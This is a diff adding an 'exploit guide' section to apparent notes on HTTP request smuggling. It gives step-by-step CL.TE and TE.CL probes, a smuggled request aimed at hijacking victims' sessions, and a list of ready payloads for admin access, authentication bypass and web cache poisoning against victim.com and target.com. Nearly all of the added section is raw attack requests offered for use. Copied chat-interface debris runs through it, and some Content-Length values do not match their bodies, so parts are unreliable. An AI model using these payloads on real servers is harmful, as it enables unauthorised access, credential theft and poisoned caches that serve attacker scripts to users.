@@ -113,3 +113,100 @@ X-Forwarded-For: 127.0.0.1, POST /evil HTTP/1.1\r\nHost: victim.com\r\nContent-L
 Explanation:
 The attacker injects a second request (POST /evil) into the X-Forwarded-For header.
 The proxy forwards the malicious X-Forwarded-For header, which the back-end server may process as a valid HTTP request, triggering the attack.
+
+
+
+
+
+
+3️⃣ Step-by-Step Exploit Guide
+🔹 Step 1: Identify if the Target is Vulnerable
+Test for CL.TE vulnerability by sending a request with both Content-Length and Transfer-Encoding: chunked headers:
+
+makefile
+Copy
+Edit
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED PAYLOAD
+If the server processes the "smuggled" request separately, it's vulnerable.
+If the server responds with an error, it may be patched.
+🔹 Step 2: Test TE.CL (Reverse Condition)
+If CL.TE is not vulnerable, try the reverse TE.CL condition:
+
+makefile
+Copy
+Edit
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+3
+GET
+0
+
+If the server appends GET to the next request, the target is vulnerable.
+🔹 Step 3: Deliver an Exploit
+Now that we know the server is vulnerable, we can inject a smuggled request.
+Example: Stealing a victim's request (Session Hijacking)
+
+makefile
+Copy
+Edit
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: victim.com
+If the victim's request gets merged with our smuggled request, we can access restricted areas or steal credentials.
+4️⃣ Common Exploit Payloads
+🔹 Basic Request Smuggling Payload
+makefile
+Copy
+Edit
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+🔹 Bypass Authentication
+makefile
+Copy
+Edit
+POST /login HTTP/1.1
+Host: target.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+POST /admin HTTP/1.1
+Host: target.com
+Authorization: Bearer attacker-token
+🔹 Web Cache Poisoning
+makefile
+Copy
+Edit
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+GET /evil.js HTTP/1.1
+Host: target.com
